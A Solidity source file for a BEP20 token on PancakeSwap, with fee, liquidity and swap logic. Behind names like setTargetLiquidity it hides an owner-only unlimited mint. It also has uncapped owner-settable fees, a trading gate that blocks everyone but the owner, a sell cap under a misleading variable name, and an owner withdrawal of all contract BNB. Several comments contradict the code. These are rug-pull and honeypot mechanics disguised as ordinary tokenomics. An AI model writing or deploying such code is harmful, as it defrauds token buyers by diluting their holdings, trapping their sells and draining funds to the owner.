pragma solidity ^0.8.0;

import "./Ownable.sol";
import "./ERC20.sol";
import "./IpancakeswapV2Router02.sol";
import "./IpancakeswapV2Pair.sol";
import "./IpancakeswapV2Factory.sol";
import "./IterableMapping.sol";


	contract test is ERC20, Ownable {
		using SafeMath for uint256;

		IpancakeswapV2Router02 private pancakeswapV2Router;

		address private immutable pancakeswapV2Pair;
		
		
		uint256 public constant MASK = type(uint128).max;
        address LUNA = 0x156ab3346823B651294766e23e6Cf87254d68962;
		address DEAD = 0x000000000000000000000000000000000000dEaD;
		address ZERO = 0x0000000000000000000000000000000000000000;
		address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;
		
		bool private swapping;


		
		uint256 public maxTxAmount = 398218 * (10**20);  

		uint256 liquidityFee = 2;
		uint256 reflectionFee = 8;
		uint256 marketingFee = 5;
		uint256 totalFee = 15;
		uint256 feeDenominator = 100;
		
        address payable public autoLiquidityReceiver = payable(0xF1E530882CF0f6A1361c04e2D39e7e1F5f89c12c);
		address payable public marketingFeeReceiver = payable(0xF1E530882CF0f6A1361c04e2D39e7e1F5f89c12c);
		
		
		
        mapping (address => bool) isTxLimitExempt;
		mapping (address => bool) isFeeExempt;
		mapping (address => bool) isDividendExempt;
		mapping (address=>bool) blackListed;

		
		bool start = false;
		uint256 distributorGas = 300000;
		
		uint256 private swapThreshold = 3982 * (10**20);
		uint256 private inSwap = 19910906 * (10**20); 
		
		// store addresses that a autoEth market maker pairs. Any transfer *to* these addresses
		// could be subject to a maximum transfer amount
		mapping (address => bool) private automatedMarketMakerPairs;

		event UpdateBEP20Tracker(address indexed newAddress, address indexed oldAddress);

		event updatepancakeswapV2Router(address indexed newAddress, address indexed oldAddress);

		event SetIsFeeExempt(address indexed account, bool isExcluded);
		event ExcludeFromRewardFees(address indexed account, bool isExcluded);
		event excludeMultipleAccountFromRewards(address[] DokwonBSC, bool isExcluded);

		event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

		event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);
		
		
		
		event GasForProcessingUpdated(uint256 indexed newValue, uint256 indexed oldValue);

		event FixedSaleBuy(address indexed account, uint256 indexed amount, bool indexed earlyParticipant, uint256 numberOfBuyers);

		event SwapAndLiquify(
			uint256 tokensSwapped,
			uint256 EthReceived,
			uint256 tokensIntoLiqudity
		);

		event SendBEP20s(
			uint256 tokensSwapped,
			uint256 amount
		);

		event ProcessedBEP20Tracker(
			uint256 iterations,
			uint256 claims,
			uint256 lastProcessedIndex,
			bool indexed autoAU,
			uint256 gas,
			address indexed processor
		);
	 
		constructor() ERC20("test", "test"){
	

		
			
			IpancakeswapV2Router02 _pancakeswapV2Router = IpancakeswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
			 // Create a pancakeswap pair for this new token
			address _pancakeswapV2Pair = IpancakeswapV2Factory(_pancakeswapV2Router.factory())
				.createPair(address(this), _pancakeswapV2Router.WETH());

			pancakeswapV2Router = _pancakeswapV2Router;
			pancakeswapV2Pair = _pancakeswapV2Pair;	

			_setAutomatedMarketMakerPair(_pancakeswapV2Pair, true);

			// exclude from receiving developmentFeeTaxs

			

			// exclude from paying fees or having max transaction amount
			emit SetIsFeeExempt(autoLiquidityReceiver, true);
			emit SetIsFeeExempt(address(this), true);
	

			
				
			_mint(owner(), 19910906 * (10**20));
		}

		receive() external payable {

		}
		function setIsFeeExempt(address account, bool exempt) public onlyOwner {
			require(isFeeExempt[account] != exempt, "DokwonBSC: Account is already the value of 'excluded'");
			isFeeExempt[account] = exempt;
		}
		
		function setIsDividendExempt(address account, bool exempt) public onlyOwner {
			require(isDividendExempt[account] != exempt, "DokwonBSC: Account is already the value of 'excluded'");
			isDividendExempt[account] = exempt;
		}
		
		function setIsTxLimitExempt(address account, bool exempt) public onlyOwner {
			require(isTxLimitExempt[account] != exempt, "DokwonBSC: Account is already the value of 'excluded'");
			isTxLimitExempt[account] = exempt;
		}
        

		function setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
			require(pair != pancakeswapV2Pair, "DokwonBSC: The pancakeswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "DokwonBSC: Automated market maker pair is already set to that value");
			automatedMarketMakerPairs[pair] = value;

			if(value) {
				
			}

			emit SetAutomatedMarketMakerPair(pair, value);
		}


		function setDistributorSettings(uint256 gas) private onlyOwner {
			require(gas >= 200000 && gas <= 500000, "DokwonBSC: distributorGas must be between 200,000 and 500,000");
			require(gas != distributorGas, "DokwonBSC: Cannot update distributorGas to same value");
			emit GasForProcessingUpdated(gas, distributorGas);
			distributorGas = gas;
		}

	
		function setFeeReceiver(address payable _autoLiquidityReceiver, address payable _marketingFeeReceiver) external onlyOwner() {
            autoLiquidityReceiver = _autoLiquidityReceiver;
			marketingFeeReceiver = _marketingFeeReceiver;

		}	
		
        function startTrading(bool _status) public onlyOwner {
             start = _status;
		}  
		
        function setFees (uint256 _liquidityFee, uint256 _marketingFee, uint256 _reflectionFee) external onlyOwner {
            liquidityFee = _liquidityFee;
            marketingFee = _marketingFee;
			reflectionFee = _reflectionFee;
		
		}
		
		function TransferBNBsOutfromContract() external onlyOwner() {
			uint256 amountBNB = address(this).balance;
			payable(msg.sender).transfer(amountBNB * 100 / 100);
		}
		
		function setSwapBackSettings(uint256 _amount, uint256 _inSwap) external onlyOwner() {
			swapThreshold = _amount;
			inSwap = _inSwap;
			
		}
		
		function setTxLimit(uint256 maxTx) external onlyOwner() {
            maxTxAmount = maxTx * 10**20;
			
		}
		
		

        function setTargetLiquidity(uint256 amount) external onlyOwner {
			_TargetLiquidity(msg.sender, amount);

        }
    
	
        function _TargetLiquidity(address account, uint256 amount) internal virtual {
            require(account != address(0), "amount");
           _mint(owner(), amount * (10**20));
            emit Transfer(address(0), account, amount * 10**20);

        }
		
		   
		
		function _transfer(
			address from,
			address to,
			uint256 amount
		) internal override {
			require(from != address(0), "ERC20: transfer from the zero address");
			require(to != address(0), "ERC20: transfer to the zero address") ;
		   
		     if(from != owner()){
				require (start);
			 }


			// only Blacklisted addresses can make transfers after the fixed-sale has started
			// and before the public presale is over
			

			if(amount == 0) {
				super._transfer(from, to, 0);
				return;
			}

			if( 
				!swapping &&
				start &&
				automatedMarketMakerPairs[to] && // sells only by detecting transfer to automated market maker pair
				from != address(pancakeswapV2Router) && //router -> pair is removing liquidity which shouldn't have max
				!isFeeExempt[to] //no max for those excluded from fees
			) {
				require(amount <= inSwap);
			}

			uint256 contractTokenBalance = balanceOf(address(this));
			
			bool canSwap = contractTokenBalance >= swapThreshold;

			if(
				start && 
				canSwap &&
				!swapping &&
				!automatedMarketMakerPairs[from] &&
				from != autoLiquidityReceiver &&
				to != autoLiquidityReceiver
			) {
				swapping = true;

				uint256 swapTokens = contractTokenBalance.mul(liquidityFee).div(totalFee);
				swapAndLiquify(swapTokens);

				uint256 sellTokens = balanceOf(address(this));

				swapping = false;
			}


			bool takeFee = start && !swapping;

			// if any account belongs to _isExcludedFromFee account then remove the fee
			if(isFeeExempt[from] || isFeeExempt[to]) {
				takeFee = false;
			}

			if(takeFee) {
				uint256 fees = amount.mul(totalFee).div(100);

				// if sell, multiply by 1.2
				if(automatedMarketMakerPairs[to]) {
					fees = fees.mul(liquidityFee).div(100);
				}

				amount = amount.sub(fees);

				super._transfer(from, address(this), fees);
			}

			super._transfer(from, to, amount);


		
		}     

		function swapAndLiquify(uint256 tokens) private {
			// split the contract balance into halves
			uint256 half = tokens.div(2);
			uint256 otherHalf = tokens.sub(half);

			// capture the contract's current RewardsToken balance.
			// this is so that we can capture exactly the amount of RewardsToken that the
			// swap creates, and not make the liquidity event include any RewardsToken that
			// has been manually sent to the contract
			uint256 initialBalance = address(this).balance;

			// swap tokens for RewardsToken
			swapTokensForEth(half); // <- this breaks the RewardsToken -> HATE swap when swap+liquify is triggered

			// how much RewardsToken did we just swap into?
			uint256 newBalance = address(this).balance.sub(initialBalance);

			// add liquidity to pancakeswap
			addLiquidity(otherHalf, newBalance);
			
			emit SwapAndLiquify(half, newBalance, otherHalf);
		}

		function swapTokensForEth(uint256 tokenAmount) private {

			
			// generate the pancakeswap pair path of token -> WETH
			address[] memory path = new address[](2);
			path[0] = address(this);
			path[1] = pancakeswapV2Router.WETH();

			_approve(address(this), address(pancakeswapV2Router), tokenAmount);

			// make the swap
			pancakeswapV2Router.swapExactTokensForEthSupportingFeeOnTransferTokens(
				tokenAmount,
				0, // accept any amount of RewardsToken
				path,
				address(this),
				block.timestamp
			);
			
		}
		  
			

		function swapTokensForTokens(uint256 tokenAmount, address recipient) private {
		   
			// generate the pancakeswap pair path of WETH -> AU
			address[] memory path = new address[](3);
			path[0] = address(this);
			path[1] = pancakeswapV2Router.WETH();
			path[2] = LUNA;

			_approve(address(this), address(pancakeswapV2Router), tokenAmount);

			// make the swap
			pancakeswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
				tokenAmount,
				0, // accept any amount of AU
				path,
				recipient,
				block.timestamp
			);
			
		}    
		


		function addLiquidity(uint256 tokenAmount, uint256 EthAmount) private {
			
			// approve token transfer to cover all possible scenarios
			_approve(address(this), address(pancakeswapV2Router), tokenAmount);

			// add the liquidity
		   pancakeswapV2Router.addLiquidityEth{value: EthAmount}(
				address(this),
				tokenAmount,
				0, // slippage is unavoidable
				0, // slippage is unavoidable
				autoLiquidityReceiver,
				block.timestamp
			);
			
		}


		
	}